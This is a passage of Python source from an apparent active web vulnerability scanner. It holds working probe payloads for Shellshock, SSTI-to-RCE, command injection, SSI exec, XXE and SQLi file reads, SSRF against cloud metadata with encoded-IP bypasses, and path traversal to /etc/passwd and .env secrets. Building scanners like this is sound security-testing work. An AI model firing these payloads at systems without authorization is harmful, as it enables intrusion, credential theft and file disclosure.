            if CGI_RX.search(p):
                shk.append(root)
            for sp in dict.fromkeys(shk):
                sk = (h, sp)
                if sk in shock_done:
                    continue
                shock_done.add(sk)
                cmark = "sb" + os.urandom(3).hex()
                ctl = await get(s, sp, extra={"User-Agent": cmark})
                if ctl and cmark.encode() in ctl[2]:
                    continue            # server echoes the UA: can't distinguish
                r = await get(s, sp, extra={
                    "User-Agent": "() { :; }; echo; echo " + cmark})
                if r and cmark.encode() in r[2]:
                    findings.append(
                        f"[SHELLSHOCK] {sp} executes shell smuggled into the "
                        f"User-Agent () {{ :; }}; echo (CVE-2014-6271 class) - "
                        f"RCE proven")
                    n += 1

        # method override: control GET must stay 2xx while the override
        # header flips the verb verdict to 405/501 (twice, for stability)
        if cap[0] >= 6 and first_t.get(h) is t:
            c0 = await get(s, root)
            if c0 and 200 <= c0[0] < 300:
                for hn in ("X-HTTP-Method-Override", "X-Method-Override"):
                    r1 = await get(s, root, extra={hn: "DELETE"})
                    if r1 and r1[0] in (405, 501):
                        r2 = await get(s, root, extra={hn: "DELETE"})
                        if r2 and r2[0] in (405, 501):
                            findings.append(
                                f"[MTHD-OVERRIDE] {h}{p} honored {hn}: DELETE "
                                f"(control 2xx -> {r1[0]}) - state-changing "
                                f"methods switchable via header")
                            n += 1
                        break

        # template injection via User-Agent / Cookie / Referer: apps often
        # interpolate these into server-side templates/logs without any filter
        if cap[0] >= 5:
            # benign baseline: if the root page ALREADY contains both probe
            # products without any payload, the numbers are static content
            bpre = await get(s, root)
            static_num = bool(bpre and bpre[2] and any(
                hit in bpre[2] and chit in bpre[2]
                for _p, hit, _c, chit, _e in SSTI_PROBES))
            if not static_num:
                for hname, hval in (("User-Agent", SSTI_PROBE),
                                    ("Cookie", "sxe=" + SSTI_PROBE),
                                    ("Referer", SSTI_PROBE)):
                    hs_ = await get(s, root, extra={hname: hval})
                    if hs_ and hs_[2]:
                        for pat, hit, cpat, chit, eng in SSTI_PROBES:
                            if hit in hs_[2] and chit in hs_[2]:
                                findings.append(
                                    f"[PARAM-SSTI] {h}{p} evaluated {pat.decode()} "
                                    f"-> {hit.decode()} (control {cpat.decode()} -> "
                                    f"{chit.decode()}) ({eng}) via {hname} header")
                                n += 1
                                break
        # log4shell lookup via header channel: `${jndi:ldap://..}` is the
        # RCE classic but `${env:PATH}` expansion is the same lookup engine
        # with zero side effects - an echoed literal is a dead channel, an
        # echoed EXPANDED value proves the server interpolated the lookup
        if cap[0] >= 4:
            ctrl = await get(s, root, extra={"User-Agent": "sxeL4jCtrl77"})
            if (ctrl and ctrl[2] and b"sxeL4jCtrl77" in ctrl[2]
                    and b"${env:PATH}" not in ctrl[2]):
                lr = await get(s, root, extra={
                    "User-Agent": "${env:PATH}"})
                if (lr and lr[2] and b"${env:PATH}" not in lr[2]
                        and (b"C:\\" in lr[2] or b"/usr/" in lr[2]
                             or b"/bin/" in lr[2])):
                    findings.append(
                        f"[LOG4J-LOOKUP] {h}{p} expands ${{env:PATH}} sent "
                        f"in the User-Agent header (literal replaced by the "
                        f"env value) - log4j/Log4Shell lookup engine active; "
                        f"${{jndi:ldap://attacker/a}} would be RCE")
                    n += 1

        # auth bypass: restricted admin paths + edge-routing header tricks
        if authz and h not in authz_done and cap[0] >= 40:
            authz_done.add(h)
            for ap_ in AUTH_PATHS:
                if cap[0] < 12:
                    break
                base = await get(s, f"{sc}://{h}{ap_}")
                if base and base[0] in (401, 403, 405):
                    for bh in AUTH_BYPASS_HDRS:
                        if cap[0] < 8:
                            break
                        r = await get(s, f"{sc}://{h}{ap_}", extra=bh)
                        if (r and r[0] == 200 and len(r[2]) > 80
                                and not _body_similar(r[2], base[2])):
                            # D9: re-fetch WITHOUT the header right before
                            # reporting - transient auth (WAF flap, expired
                            # cookie) must not turn one 200 into a bypass
                            base2 = await get(s, f"{sc}://{h}{ap_}")
                            if base2 and base2[0] not in (401, 403, 405):
                                break        # path no longer restricted
                            if not base2:
                                continue     # unconfirmed: skip this header
                            findings.append(
                                f"[AUTH-BYPASS] {h}{ap_} returned 200 to "
                                f"{list(bh)[0]}: {list(bh.values())[0]} "
                                f"(401/403 normally, re-confirmed) - "
                                f"IP/authz header bypass")
                            n += 1
                            break
            # edge routing: X-Original-URL serves another resource at /
            if cap[0] >= 12:
                b0 = await get(s, f"{sc}://{h}/")
                if b0 and b0[0] == 200 and len(b0[2]) > 80:
                    for ap_ in AUTH_PATHS:
                        if cap[0] < 8:
                            break
                        r = await get(s, f"{sc}://{h}/",
                                      extra={"X-Original-URL": ap_})
                        if (r and r[0] == 200 and len(r[2]) > 80
                                and not _body_similar(r[2], b0[2])
                                and any(m in r[2].lower() for m in AUTH_MARKERS)):
                            # D9-style confirm: a dynamic/A-B root page must
                            # not turn one different-looking 200 into a
                            # critical - re-fetch root AND replay the header
                            b0b = await get(s, f"{sc}://{h}/")
                            if not b0b or not _body_similar(b0b[2], b0[2]):
                                continue     # root changed: not reproducible
                            r2 = await get(s, f"{sc}://{h}/",
                                           extra={"X-Original-URL": ap_})
                            if not r2 or r2[0] != 200 or not _body_similar(r2[2], r[2]):
                                continue     # header response flapped too
                            findings.append(
                                f"[AUTH-BYPASS] {h}/ serves {ap_} content "
                                f"when X-Original-URL: {ap_} is sent - edge "
                                f"routing bypass (re-confirmed twice)")
                            n += 1
                            break

        # XXE: POST XML only to XML-hinted paths (entity expansion + file read)
        if xxe and XML_HINT_RX.search(p) and cap[0] >= 9:
            # D6: no-DOCTYPE control carrying the same canary as element
            # content - a body reflector echoes the canary sitting inside the
            # DOCTYPE declaration itself, which would fake entity expansion
            xctl = await postx(
                s, root, '<?xml version="1.0"?><d><name>sxeXXE9f3a</name></d>')
            reflect = bool(xctl and b"sxeXXE9f3a" in xctl[2])
            r = None if reflect else await postx(s, root, XXE_INTERNAL)
            if r and b"sxeXXE9f3a" in r[2]:
                findings.append(
                    f"[XXE] {h}{p} resolves XML entities (internal entity "
                    f"reflected) - external entities likely reachable")
                n += 1
                for pay, pat in ((XXE_PASSWD, b"root:x:0:0"),
                                 (XXE_PASSWD, b"root:*:0:0"),
                                 (XXE_WININI, b"[fonts]")):
                    if cap[0] < 6:
                        break
                    r2 = await postx(s, root, pay)
                    if r2 and pat in r2[2]:
                        what = ("/etc/passwd" if pat.startswith(b"root:")
                                else "C:\\Windows\\win.ini")
                        findings.append(
                            f"[XXE-READ] {h}{p} reads {what} via external "
                            f"entity - file disclosure")
                        n += 1
                        break

        # GraphQL batching: a JSON array of queries in one POST defeats
        # per-request rate limits and depth analysis (read-only probe)
        if xxe and "graphql" in p.lower() and cap[0] >= 6:
            rg = await postx(s, root, '[{"query":"{__typename}"}]',
                             "application/json")
            # D7: require the EXECUTION shape ("__typename":) - reflecting the
            # request array back verbatim does not prove batching was accepted
            if (rg and rg[2].lstrip().startswith(b"[")
                    and b'"__typename":' in rg[2]):
                findings.append(
                    f"[GQL-BATCH] {h}{p} accepts JSON query batching (array "
                    f"response) - query-volume/rate-limit bypass possible")
                n += 1

        for key in keys:
            if cap[0] <= 0:
                break
            rest = [f"{k}=1" for k in keys if k != key]
            pre = root + "?" + "&".join(rest + [f"{key}="])
            low = key.lower()

            # D13: redirect triage only for URL-ish param names - probing
            # every key burned budget on params that never redirect
            redir_done = low not in URL_KEYS
            redir_behavior = False
            if not redir_done:
                rr = await get(s, pre + quote("https://" + REDIR_CANARY, safe=""))
                if rr:
                    st, hdr, body = rr
                    loc = hdr.get("location", "")
                    if not loc and hdr.get("refresh"):
                        # D15: Refresh: 0;url=... is an equally valid redirect
                        loc = re.split(r"url\s*=", hdr["refresh"], 1,
                                       flags=re.I)[-1].strip()
                    is3 = 300 <= st < 400
                    if is3 or _body_redir_hit(body):
                        redir_behavior = True
                    if _redir_to_canary(loc) and (is3 or "refresh" in hdr):
                        findings.append(f"[PARAM-REDIRECT] {h}{p}?{key} -> "
                                        f"{loc[:80]} (open redirect)")
                        n += 1
                        redir_done = True
                    elif _body_redir_hit(body):
                        findings.append(f"[PARAM-REDIRECT] {h}{p}?{key} -> "
                                        f"in-page redirect to canary")
                        n += 1
                        redir_done = True
            # bypass payloads: protocol-relative //host and backslash /\host
            # evade naive allowlists that only check the scheme prefix
            if not redir_done:
                for pay in ("//" + REDIR_CANARY, "/\\" + REDIR_CANARY,
                            "\\/" + REDIR_CANARY):
                    if cap[0] < 2:
                        break
                    rr = await get(s, pre + quote(pay, safe=""))
                    if not rr:
                        continue
                    st, hdr, body = rr
                    loc = hdr.get("location", "")
                    if not loc and hdr.get("refresh"):
                        loc = re.split(r"url\s*=", hdr["refresh"], 1,
                                       flags=re.I)[-1].strip()
                    if _redir_to_canary(loc) and (300 <= st < 400
                                                  or "refresh" in hdr):
                        findings.append(f"[PARAM-REDIRECT] {h}{p}?{key} -> "
                                        f"{loc[:80]} (open redirect, bypass "
                                        f"payload `{pay}`)")
                        n += 1
                        redir_done = True
                        break
                    if _body_redir_hit(body):
                        findings.append(f"[PARAM-REDIRECT] {h}{p}?{key} -> "
                                        f"in-page redirect to canary "
                                        f"(bypass payload `{pay}`)")
                        n += 1
                        redir_done = True
                        break
            # scheme bypasses: host-allowlist validators mishandle
            # javascript:/data: targets - Location turns into an XSS vector
            # (only when the endpoint demonstrably redirects somewhere else)
            if not redir_done and redir_behavior:
                for pay in ("javascript:alert(sxjs9q)",
                            "data:text/html,sxjs9q"):
                    if cap[0] < 3:
                        break
                    rr = await get(s, pre + quote(pay, safe=""))
                    if not rr:
                        continue
                    st, hdr, body = rr
                    loc = hdr.get("location", "")
                    sch = loc.split(":", 1)[0].lower()
                    if (300 <= st < 400 and sch in ("javascript", "data")
                            and "sxjs9q" in loc):
                        findings.append(
                            f"[PARAM-REDIRECT] {h}{p}?{key} -> {loc[:70]} "
                            f"({sch}: Location header - XSS vector)")
                        n += 1
                        redir_done = True
                        break
                    if (b"sxjs9q" in body and re.search(
                            rb"http-equiv\s*=\s*[\"']?refresh", body, re.I)):
                        findings.append(
                            f"[PARAM-REDIRECT] {h}{p}?{key} -> in-page "
                            f"refresh carrying {sch or 'javascript'}: "
                            f"(XSS vector)")
                        n += 1
                        redir_done = True
                        break

            r = await get(s, pre + quote(XSS_CANARY.decode(), safe=""))
            # D8: only non-error html/xml (or CT-less, browser-sniffed)
            # responses can be XSS - a canary inside a JSON error body or a
            # 404 soft page is not a reflected-XSS finding
            rct = (r[1].get("content-type", "") if r else "")
            if (r and 200 <= r[0] < 400
                    and ("html" in rct or "xml" in rct or not rct)
                    and XSS_CANARY in r[2]):
                ctx = _xss_context(r[2])
                rb2 = await get(s, pre + quote(
                    "svqx9a7z\" onfocus=svqx9a7z x=\"", safe=""))
                broke = bool(rb2 and 200 <= rb2[0] < 400
                             and _xss_breakout(rb2[2]))
                if not broke and cap[0] >= 2:
                    rb3 = await get(s, pre + quote(
                        "svqx9a7z' onfocus=svqx9a7z x='", safe=""))
                    broke = bool(rb3 and 200 <= rb3[0] < 400
                                 and _xss_breakout(rb3[2]))
                detail = (f" in {ctx} context" if ctx and ctx != "text" else "")
                if broke:
                    detail += (" - quote/attribute breakout CONFIRMED "
                               "(event handler injected raw)")
                findings.append(f"[PARAM-XSS] {h}{p}?{key} reflects "
                                f"unencoded <sxe7xq9z>{detail}")
                n += 1

            r = await get(s, pre + quote(SSTI_PROBE, safe=""))
            if r:
                # benign control: if a plain request already shows BOTH
                # probe products, the page is static (template never ran)
                kpre = await get(s, pre + quote("sxebase" + os.urandom(3).hex(),
                                                safe=""))
                static_num = bool(kpre and kpre[2] and any(
                    hit in kpre[2] and chit in kpre[2]
                    for _p, hit, _c, chit, _e in SSTI_PROBES))
                ssti_hit = False
                for pat, hit, cpat, chit, eng in SSTI_PROBES:
                    # D3: both the probe AND its different-operand control
                    # must evaluate - one number alone is coincidence
                    if not static_num and hit in r[2] and chit in r[2]:
                        findings.append(
                            f"[PARAM-SSTI] {h}{p}?{key} evaluated "
                            f"{pat.decode()} -> {hit.decode()} "
                            f"(control {cpat.decode()} -> {chit.decode()}) "
                            f"({eng})")
                        n += 1
                        ssti_hit = True
                        break
                # exploit stage: popen echo marker = RCE proof; a plain
                # reflector would echo the bare marker too, so control first
                if ssti_hit and cap[0] >= 4:
                    mark = "sx" + os.urandom(3).hex()
                    ctl4 = await get(s, pre + mark)
                    if ctl4 and ctl4[2] and mark.encode() in ctl4[2]:
                        pass            # raw echo: can't prove execution
                    else:
                        for pay in SSTI_RCE:
                            if cap[0] < 3:
                                break
                            rr = await get(s, pre + quote(
                                pay.replace("sxRCEm", mark), safe=""))
                            if rr and mark.encode() in rr[2]:
                                findings.append(
                                    f"[SSTI-RCE] {h}{p}?{key} executes OS "
                                    f"commands via template (echoed marker "
                                    f"{mark}, bare-marker control clean) - "
                                    f"RCE proven")
                                n += 1
                                break

            # JSONP callback XSS: a reflected callback runs attacker JS when
            # the endpoint is included as <script src=...>
            if low in CALLBACK_KEYS and cap[0] >= 3:
                cmark = "sxCbk" + os.urandom(3).hex()
                rj = await get(s, pre + quote(cmark, safe=""))
                if rj and cmark.encode() in rj[2]:
                    ct = rj[1].get("content-type", "")
                    called = bool(re.search(
                        rb"\b" + cmark.encode() + rb"\s*\(", rj[2]))
                    if called or "javascript" in ct or "ecmascript" in ct:
                        findings.append(
                            f"[JSONP] {h}{p}?{key} reflects callback {cmark} "
                            f"({'callable' if called else 'js content-type ' + ct})"
                            f" - XSS via script inclusion (check CORS/token)")
                        n += 1

            # prototype pollution: a polluting key is stored server-side, then
            # a clean refetch still carries the marker -> persisted pollution
            if low in PROTO_KEYS and cap[0] >= 8:
                pmark = "sxePr" + os.urandom(3).hex()
                for pay in (f"__proto__[{pmark}]=1",
                            f"constructor[prototype][{pmark}]=1"):
                    if cap[0] < 6:
                        break
                    await get(s, pre + "1&" + pay)   # store the pollution
                    rref = await get(s, pre + "1")   # clean refetch
                    if rref and pmark.encode() in rref[2]:
                        # D11: junk sibling carrying the same marker - if THAT
                        # persists too, the server merely remembers query
                        # params (session/cache), which is not pollution
                        jk = "sxpj" + os.urandom(2).hex()
                        await get(s, pre + f"1&{jk}[{pmark}]=1")
                        jref = await get(s, pre + "1")
                        if not jref or pmark.encode() in jref[2]:
                            break    # generic persistence / no control answer
                        findings.append(
                            f"[PROTO-POLLUTION] {h}{p}?{key} persists "
                            f"`{pay.split('=')[0]}` (marker {pmark} present on "
                            f"clean refetch, junk-sibling control clean) - "
                            f"object merge pollutes prototypes")
                        n += 1
                        break

            sql_hit = False
            if sqli:
                # D5: benign-value baseline first - if the page already
                # carries SQL-ish error text, an error match on the injected
                # response proves nothing (static error pages, docs, WAFs)
                base_r = await get(s, pre + "1")
                base_err = bool(base_r and any(
                    re.search(pat, base_r[2], re.I) for pat in SQL_ERR))
                r = await get(s, pre + quote("'\"", safe=""))
                if r and not base_err:
                    for pat in SQL_ERR:
                        if re.search(pat, r[2], re.I):
                            db = _sql_db(r[2])
                            findings.append(
                                f"[PARAM-SQLI] {h}{p}?{key} triggers DB error"
                                + (f" ({db})" if db else "")
                                + " (absent on benign baseline)")
                            n += 1
                            sql_hit = True
                            break

                if not sql_hit and cap[0] >= 12:
                    # boolean-blind: stable true~=baseline vs false differential
                    # (reuses the D5 baseline fetch - no extra request)
                    if base_r and base_r[0] == 200:
                        bl = base_r[2]
                        for bt, bf in SQL_BOOL_PAIRS:
                            if cap[0] < 8:
                                break
                            rt = await get(s, pre + quote(bt, safe=""))
                            rf = await get(s, pre + quote(bf, safe=""))
                            if not (rt and rf and rt[0] == 200 and rf[0] == 200):
                                continue
                            if abs(len(rt[2]) - len(rf[2])) < 30:
                                continue
                            if _body_similar(rt[2], rf[2]):
                                continue
                            if not _body_similar(rt[2], bl):
                                continue
                            rf2 = await get(s, pre + quote(bf, safe=""))
                            if rf2 and _body_similar(rf[2], rf2[2]):
                                findings.append(
                                    f"[PARAM-SQLI] {h}{p}?{key} boolean-blind "
                                    f"differential stable across rechecks "
                                    f"(true~=baseline, false differs)")
                                n += 1
                                sql_hit = True
                                break

                # time-based blind: fast baseline + fast recovery + two delays
                # (slow = connection timeout OR >=2s elapsed -> covers SLEEP,
                #  WAITFOR and CPU-delay payloads like BENCHMARK)
                if not sql_hit and cap[0] >= 16:
                    b0 = await gett(s, pre + "1", 6)
                    if b0 and b0[0] == 200 and b0[3] < 1.5:
                        for pay in SQL_TIME_PAYLOADS:
                            if cap[0] < 10:
                                break
                            t1 = await gett(s, pre + quote(pay, safe=""), 7)
                            if t1 is None or t1[3] < 2.0:
                                continue        # fast OR no answer: wrong
                            rec = await gett(s, pre + "1", 6)   # dialect/flake
                            if not (rec and rec[0] == 200 and rec[3] < 1.5):
                                break           # flaky/slow target: stop timing tests
                            t2 = await gett(s, pre + quote(pay, safe=""), 7)
                            # D2: BOTH probes must report a measured delay -
                            # a None is a client timeout/connection error, not
                            # evidence the server waited
                            if t2 is not None and t2[3] >= 2.0:
                                findings.append(
                                    f"[PARAM-SQLI-TIME] {h}{p}?{key} delays the "
                                    f"response >2s twice under "
                                    f"`{pay.strip()[:34]}` - time-based blind SQLi")
                                n += 1
                                sql_hit = True
                                break

                # NoSQLi: [$gt]=0 vs [$gt]=huge differ while repeat stays stable
                if not sql_hit and cap[0] >= 12:
                    q0 = root + "?" + "&".join(rest + [f"{key}[$gt]=0"])
                    q9 = root + "?" + "&".join(rest + [f"{key}[$gt]=99999999"])
                    g0 = await get(s, q0)
                    if g0 and g0[0] == 200 and g0[2]:
                        g9 = await get(s, q9)
                        if g9 and not _body_similar(g0[2], g9[2]):
                            g0b = await get(s, q0)
                            if g0b and _body_similar(g0[2], g0b[2]):
                                # D10: junk-key control - the SAME operator on
                                # an unknown key must not produce the same
                                # stable difference, otherwise the endpoint
                                # just varies and the key name means nothing
                                jk = "sxnk" + os.urandom(3).hex()
                                j0 = await get(s, root + "?" + "&".join(
                                    rest + [f"{jk}[$gt]=0"]))
                                j9 = await get(s, root + "?" + "&".join(
                                    rest + [f"{jk}[$gt]=99999999"]))
                                if (j0 and j9 and j0[0] == 200 and j9[0] == 200
                                        and not _body_similar(j0[2], j9[2])):
                                    pass    # junk key differs too: variance
                                else:
                                    findings.append(
                                        f"[PARAM-NOSQLI] {h}{p}?{key} treats "
                                        f"[$gt] as a query operator (0 vs "
                                        f"99999999 give different, stable "
                                        f"responses; junk-key control clean)")
                                    n += 1
                                    sql_hit = True

                # exploit stage: error-based extraction (version, then db/user
                # for the same family that matched first). misses are judged
                # per family at its boundary: a fully dead MySQL group no
                # longer aborts the run before PostgreSQL/MSSQL are tried
                # (the global miss>=5 counter used to die inside group one)
                if sql_hit and cap[0] >= 4:
                    leaks, fam, prev_db = [], None, None
                    for db_name, label, pay, rx in SQL_EXTRACT:
                        if prev_db is not None and db_name != prev_db:
                            if fam:
                                break       # matched family fully collected
                        prev_db = db_name
                        if cap[0] < 3:
                            break
                        er = await get(s, pre + quote(pay, safe=""))
                        if not er:
                            continue
                        m = re.search(rx, er[2], re.I)
                        if m:
                            val = (m.group(1).replace(b"\n", b" ")
                                   .strip()[:70].decode("utf-8", "ignore"))
                            if not any(l.startswith(label + "=")
                                       for l in leaks):
                                leaks.append(f"{label}=\"{val}\"")
                            fam = db_name
                        elif fam:
                            break           # family started, then missed
                    if leaks:
                        findings.append(
                            f"[SQLI-EXTRACT] {h}{p}?{key} error-based "
                            f"extraction: {fam} " + " ".join(leaks) +
                            " - arbitrary SQL read proven")
                        n += 1

                    # file-read escalation: a confirmed SQLi that can
                    # LOAD_FILE/pg_read_file server files proves OS-level
                    # read (passwd / win.ini content must come back in the
                    # error - a NULL LOAD_FILE or no error never claims)
                    if leaks and cap[0] >= 3:
                        for pay, rx in (
                                (pl, rxf) for _f, pl, rxf in SQL_FILE_READ
                                if _f == fam):
                            if cap[0] < 2:
                                break
                            fr = await get(s, pre + quote(pay, safe=""))
                            if not fr:
                                continue
                            mfx = re.search(rx, fr[2], re.I)
                            if mfx:
                                frag = (mfx.group(1).replace(b"\n", b" ")
                                        .strip()[:70].decode("utf-8", "ignore"))
                                findings.append(
                                    f"[SQLI-FILE-READ] {h}{p}?{key} reads "
                                    f"server files via {fam} LOAD_FILE/"
                                    f"pg_read_file (e.g. `{frag}`) - "
                                    f"OS-level file disclosure proven")
                                n += 1
                                break

            crand = os.urandom(3).hex()
            rc = await get(s, pre + quote(f"\r\nX-Sxe-Crlf: sxc{crand}", safe=""))
            if rc and f"sxc{crand}" in rc[1].get("x-sxe-crlf", ""):
                findings.append(f"[PARAM-CRLF] {h}{p}?{key} injects response "
                                f"headers (X-Sxe-Crlf reflected) - response splitting")
                n += 1

            if cmdi and low in EXEC_KEYS and cap[0] >= 8:
                mark = "sx" + os.urandom(3).hex()
                cmd_hit = False
                # D1: a plain reflector echoes the bare marker as well - if
                # raw input comes back, `;echo <mark>` in the response proves
                # nothing (execution vs reflection is indistinguishable)
                cctl = await get(s, pre + mark)
                echoey = bool(cctl and cctl[2] and mark.encode() in cctl[2])
                if not echoey:
                    for shape in (";", "|", "&"):
                        rc2 = await get(s, pre + quote(f"{shape}echo {mark}", safe=""))
                        if rc2 and mark.encode() in rc2[2]:
                            findings.append(
                                f"[PARAM-CMDI] {h}{p}?{key} executes shell commands "
                                f"(echoed marker {mark} via `{shape}echo`, "
                                f"bare-marker control clean) - RCE proven")
                            n += 1
                            cmd_hit = True
                            break
                if not cmd_hit and cap[0] >= 14:
                    b0 = await gett(s, pre + "1", 6)
                    if b0 and b0[0] == 200 and b0[3] < 1.5:
                        for pay in CMDI_TIME:
                            if cap[0] < 8:
                                break
                            t1 = await gett(s, pre + quote(pay, safe=""), 7)
                            if t1 is None or t1[3] < 2.0:
                                continue        # fast OR no answer: not a delay
                            rec = await gett(s, pre + "1", 6)
                            if not (rec and rec[0] == 200 and rec[3] < 1.5):
                                break
                            t2 = await gett(s, pre + quote(pay, safe=""), 7)
                            # D2: measured delay required on BOTH probes
                            if t2 is not None and t2[3] >= 2.0:
                                findings.append(
                                    f"[PARAM-CMDI] {h}{p}?{key} delays response "
                                    f">2s twice with `ping` payload "
                                    f"(`{pay[:30]}`) - blind command injection")
                                n += 1
                                break

            # SSI injection: server-parsed pages (.shtml etc.) execute
            # directives carried in user input; control request proves the
            # plain canary is not reflected before the markup payload counts
            if cmdi and not ssi_try and cap[0] >= 8:
                ssi_try = True
                smark = "sx" + os.urandom(3).hex()
                ctl = await get(s, pre + quote(smark, safe=""))
                if ctl and ctl[0] == 200 and smark.encode() not in ctl[2]:
                    rs = await get(s, pre + quote(
                        f'<!--#exec cmd="echo {smark}" -->', safe=""))
                    if rs and rs[0] == 200 and smark.encode() in rs[2]:
                        findings.append(
                            f"[PARAM-SSI] {h}{p}?{key} evaluates SSI "
                            f"<!--#exec cmd=\"echo {smark}\" --> - "
                            f"server-side include injection")
                        n += 1

            # XPath injection: error-based, xpath-ish params only
            if sqli and (low in XPATH_KEYS or "xpath" in low) and cap[0] >= 7:
                # benign control: a page that statically contains the XPath
                # error text would claim on any payload
                kpre = await get(s, pre + quote("sxeprobe", safe=""))
                if not kpre or not any(re.search(pat, kpre[2], re.I)
                                       for pat in XPATH_ERR):
                    for pay in ("x' or '1'='1", "1 or 1=1"):
                        if cap[0] < 4:
                            break
                        xr = await get(s, pre + quote(pay, safe=""))
                        if xr:
                            for pat in XPATH_ERR:
                                if re.search(pat, xr[2], re.I):
                                    findings.append(
                                        f"[XPATHI] {h}{p}?{key} triggers XPath "
                                        f"engine error with `{pay}` - query built "
                                        f"from user input")
                                    n += 1
                                    break
                            else:
                                continue
                            break

            # LDAP injection: error-based, directory-ish params only
            if sqli and (low in LDAP_KEYS or "ldap" in low) and cap[0] >= 7:
                kpre = await get(s, pre + quote("sxeprobe", safe=""))
                if not kpre or not any(re.search(pat, kpre[2], re.I)
                                       for pat in LDAPI_ERR):
                    for pay in ("*)(uid=*", "x)(|(uid=*"):
                        if cap[0] < 4:
                            break
                        lr = await get(s, pre + quote(pay, safe=""))
                        if lr:
                            for pat in LDAPI_ERR:
                                if re.search(pat, lr[2], re.I):
                                    findings.append(
                                        f"[LDAPI] {h}{p}?{key} triggers LDAP "
                                        f"filter error with `{pay}` - filter built "
                                        f"from user input")
                                    n += 1
                                    break
                            else:
                                continue
                            break

            # benign control shared by the URL-/FILE-key probes below: a page
            # that STATICALLY contains the error/marker strings (docs, canned
            # error pages, echoed reflections) must not claim on any payload
            kctl = b""
            if low in URL_KEYS or low in FILE_KEYS:
                kc = await get(s, pre + quote("sxeBase" + os.urandom(3).hex(),
                                              safe=""))
                kctl = kc[2] if kc and kc[2] else b""
            static_err = bool(kctl and any(
                re.search(pat, kctl, re.I) for pat in SSRF_ERR))
            static_meta = bool(kctl and any(
                m in kctl for m in (b"ami-id", b"instance-id",
                                    b"iam/security-credentials",
                                    b"local-ipv4", b"hostname")))
            static_pw = bool(kctl and (b"root:x:0:0" in kctl
                                       or b"root:*:0:0" in kctl))
            static_ini = bool(kctl and (b"[fonts]" in kctl
                                        or b"[extensions]" in kctl
                                        or b"[mci extensions]" in kctl))
            static_env = bool(kctl and (b"APP_KEY=" in kctl
                                        or b"DB_PASSWORD=" in kctl
                                        or b"AWS_SECRET" in kctl))
            static_web = bool(kctl and (b"<web-app" in kctl
                                        or b"<servlet>" in kctl
                                        or b"<filter>" in kctl))
            static_src = bool(kctl and b"PD9waHA" in kctl)

            if low in URL_KEYS:
                r = await get(s, pre + quote("http://127.0.0.1:1/", safe=""))
                if r and b"127.0.0.1" in r[2] and not static_err:
                    for pat in SSRF_ERR:
                        if re.search(pat, r[2], re.I):
                            findings.append(
                                f"[PARAM-SSRF] {h}{p}?{key} fetches attacker "
                                f"URL (connection error reflected)")
                            n += 1
                            break
                r = await get(s, pre + quote(
                    "http://169.254.169.254/latest/meta-data/", safe=""))
                if (r and not static_meta and any(k in r[2] for k in
                          (b"ami-id", b"instance-id", b"iam/security-credentials",
                           b"local-ipv4", b"hostname", b"computeMetadata",
                           b"Metadata-Flavor"))):
                    findings.append(
                        f"[SSRF-METADATA] {h}{p}?{key} READS cloud metadata at "
                        f"169.254.169.254 - rotate instance credentials")
                    n += 1
                # filter-bypass encodings: a naive allowlist that blocks the
                # literal loopback/metadata strings can still be tricked via
                # alternate IP encodings - a reflected fetch error (or the
                # metadata body) carrying the ENCODED form is direct evidence
                if cap[0] >= 3:
                    for enc in ("http://0x7f000001:1/",
                                "http://2130706433:1/",
                                "http://[::1]:1/"):
                        er = await get(s, pre + quote(enc, safe=""))
                        if (er and not static_err
                                and any(re.search(pat, er[2], re.I)
                                        for pat in SSRF_ERR)
                                and any(t in er[2] for t in (
                                    b"0x7f000001", b"2130706433", b"[::1]",
                                    b"::1"))):
                            findings.append(
                                f"[SSRF-BYPASS] {h}{p}?{key} fetches "
                                f"alternate-encoded loopback `{enc}` "
                                f"(fetch error reflected) - string IP "
                                f"filters bypassable")
                            n += 1
                            break
                    else:
                        for enc in ("http://2852039166/latest/meta-data/",
                                    "http://0xa9fea9fe/latest/meta-data/"):
                            er = await get(s, pre + quote(enc, safe=""))
                            if (er and not static_meta and any(k in er[2]
                                    for k in (b"ami-id", b"instance-id",
                                              b"iam/security-credentials",
                                              b"local-ipv4"))):
                                findings.append(
                                    f"[SSRF-BYPASS] {h}{p}?{key} reads cloud "
                                    f"metadata via encoded IP `{enc}` - "
                                    f"169.254.169.254 string filters "
                                    f"bypassable")
                                n += 1
                                break

            if low in FILE_KEYS:
                r = await get(s, pre + quote(
                    "../../../../../../../../etc/passwd", safe=""))
                if r and not static_pw and (b"root:x:0:0" in r[2]
                                            or b"root:*:0:0" in r[2]):
                    findings.append(f"[PARAM-TRAV] {h}{p}?{key} reads "
                                    f"/etc/passwd")
                    n += 1
                r = await get(s, pre + quote(
                    "..\\..\\..\\..\\..\\..\\windows\\win.ini", safe=""))
                if r and not static_ini and (b"[fonts]" in r[2]
                                             or b"[extensions]" in r[2]
                                             or b"[mci extensions]" in r[2]):
                    findings.append(f"[PARAM-TRAV] {h}{p}?{key} reads "
                                    f"C:\\Windows\\win.ini")
                    n += 1
                r = await get(s, pre + quote(
                    "../../../../../../../../.env", safe=""))
                if r and not static_env and (b"APP_KEY=" in r[2]
                                             or b"DB_PASSWORD=" in r[2]
                                             or b"AWS_SECRET" in r[2]):
                    findings.append(f"[PARAM-TRAV] {h}{p}?{key} reads "
                                    f".env secrets file")
                    n += 1
                r = await get(s, pre + quote(
                    "../../../../../../../WEB-INF/web.xml", safe=""))
                if r and not static_web and (b"<web-app" in r[2]
                                             or b"<servlet>" in r[2]
                                             or b"<filter>" in r[2]):
                    findings.append(f"[PARAM-TRAV] {h}{p}?{key} reads "
                                    f"WEB-INF/web.xml (Java config disclosure)")
                    n += 1
                r = await get(s, pre + quote(
                    "php://filter/convert.base64-encode/resource=index.php",
                    safe=""))
                if r and not static_src and b"PD9waHA" in r[2]:
                    findings.append(
                        f"[PARAM-SOURCE] {h}{p}?{key} returns base64 PHP source "
                        f"via php://filter (PD9waHA = <?php) - source disclosure")
                    n += 1
        return n

    async with tsession(conn) as s:
        totals = await asyncio.gather(*[one_target(t) for t in targets])
        if cmdi:
            roots = []
            for _path, _hs in attrib.items():
                for _h in _hs:
                    if _h not in roots:
                        roots.append(_h)
            await header_cmdi(s, roots[:4], findings, cap, sent)
        await jwt_online(s, probes, findings, attrib)
    hits = sum(totals)
    print(f"  [params] {sent[0]} requests -> {hits} findings", flush=True)
    return hits


# ---------------- active: cache poisoning / IDOR / request smuggling ----------------
CACHE_HEADERS = ("X-Forwarded-Host", "X-Host", "X-Original-Host", "Forwarded",
                 "X-Forwarded-Scheme", "X-Forwarded-Proto")


async def cache_poison(probes, findings, cap_hosts=40):
    """poison a unique path with an unkeyed header; a plain follow-up still
